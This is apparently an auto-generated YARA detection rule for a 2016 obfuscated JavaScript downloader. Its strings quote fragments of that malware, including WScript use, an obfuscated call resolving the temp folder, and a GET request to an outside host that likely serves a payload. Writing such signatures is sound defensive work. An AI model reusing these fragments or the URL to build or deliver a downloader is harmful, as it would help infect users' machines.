rule sig_20160428_f819258ec54e4cb68a19d61c85d7aecd {
  meta:
    description = "datamaliciousorder - file 20160428_f819258ec54e4cb68a19d61c85d7aecd.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "4cb438c226e83d26de1310154351b0059bc73da0605c87dafa689d29d62c4eb7"

  strings:
    $s1  = "function BsaJydQeuCtzIuuJsaByz(StiSunOjhYcbDjcOtrMbu){BnqVejDqtUhnCmuVnxZgs[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s2  = "function BsaJydQeuCtzIuuJsaByz(StiSunOjhYcbDjcOtrMbu){BnqVejDqtUhnCmuVnxZgs[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s3  = "function QpoMssJewWesGjwJxaXpg() {return BnqVejDqtUhnCmuVnxZgs[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s4  = "function HhcLflXolNziXwpWjlEdr(LpiNbtMnsTryDtaGvvBrq, WyzQeqHtqUfeWnfPvmOhv){OrxAznKwqHznPahRtwHtx = OrxAznKwqHznPahRtwHtx * 1; " ascii
    $s5  = "var BnqVejDqtUhnCmuVnxZgs = function DvbKguMltBwmVyxPjlOjl() {return QwbIiuCxeKfoDobKjsEhs[JcnDidRnbNgcRvvGdcMgv](\"WScript\"+\"" ascii
    $s6  = "return LpiNbtMnsTryDtaGvvBrq - WyzQeqHtqUfeWnfPvmOhv;};" fullword ascii
    $s7  = "JjoXvnAjqMvqZvsVtvLeu[FzjFegBhsYylFswUbtTmg](\"G\" + \"ET\", \"http://sar-decor.ru/x8skfa\", false);" fullword ascii
    $s8  = "var BnqVejDqtUhnCmuVnxZgs = function DvbKguMltBwmVyxPjlOjl() {return QwbIiuCxeKfoDobKjsEhs[JcnDidRnbNgcRvvGdcMgv](\"WScript\"+\"" ascii
    $s9  = "var QwbIiuCxeKfoDobKjsEhs = this[\"WScript\"];" fullword ascii
    $s10 = "function QpoMssJewWesGjwJxaXpg() {return BnqVejDqtUhnCmuVnxZgs[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s11 = "function HhcLflXolNziXwpWjlEdr(LpiNbtMnsTryDtaGvvBrq, WyzQeqHtqUfeWnfPvmOhv){OrxAznKwqHznPahRtwHtx = OrxAznKwqHznPahRtwHtx * 1; " ascii
    $s12 = "function PrsRwlCgqKwsVcmCluCoo(){return HiuPqqWjaIeySgaUniNsn + \"\";};" fullword ascii
    $s13 = "if (JjoXvnAjqMvqZvsVtvLeu[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s14 = "function VgpMimUwkFaxEzwIeaWqv() {return ((FjoRagVgbCftHdbGraEcp == true) && (FjoRagVgbCftHdbGraEcp == FtsGndEnpBwjDjaEjcWfs)) ?" ascii
    $s15 = "function VgpMimUwkFaxEzwIeaWqv() {return ((FjoRagVgbCftHdbGraEcp == true) && (FjoRagVgbCftHdbGraEcp == FtsGndEnpBwjDjaEjcWfs)) ?" ascii
    $s16 = "}while (ZnuHniSzeDkrAysGslYsu);" fullword ascii
    $s17 = "DxvJnnVpwDfpCqdCcgSqn = true;" fullword ascii
    $s18 = "FtsGndEnpBwjDjaEjcWfs = true; " fullword ascii
    $s19 = "function ElpSytZybTqtSkpSjxQun(IqeVlxVttPopBqcCvcIcl) {var GclQxpObxWkuZhhXbtBoe = (1, 2, 3, 4, 5, IqeVlxVttPopBqcCvcIcl); retur" ascii
    $s20 = "function UdsTxdUczAchQbqSwkPuc(){return JcnDidRnbNgcRvvGdcMgv;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}